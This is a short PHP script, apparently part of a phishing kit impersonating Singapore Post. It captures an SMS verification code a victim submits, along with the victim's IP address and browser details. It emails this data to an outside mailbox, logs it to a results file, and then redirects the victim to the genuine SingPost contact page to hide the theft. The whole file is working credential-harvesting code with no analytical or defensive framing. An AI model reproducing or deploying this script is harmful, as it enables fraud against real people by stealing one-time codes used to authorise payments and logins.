<?php
$zabi = getenv("REMOTE_ADDR");
$message .= "--++-----[ SINGAPORE POST SMS2]-----++--\n";
$message .= "-------------- BY Yass ht-----\n";
$message .= "SMS 2 : ".$_POST['sms']."\n";
$message .= "-------------- IP Infos ------------\n";
$message .= "IP       : $zabi\n";
$message .= "BROWSER  : ".$_SERVER['HTTP_USER_AGENT']."\n";
$message .= "----------------------By Yass ht ----------------------\n";
$subject = "SINGAPORE POST SMS2 [ " . $zabi . " ]  ";
$email = "jassem93s@yandex.com";
mail($email,$subject,$message);
    $text = fopen('../rzlt.txt', 'a');
fwrite($text, $message);

header("Location: https://www.singpost.com/contact-us");
?>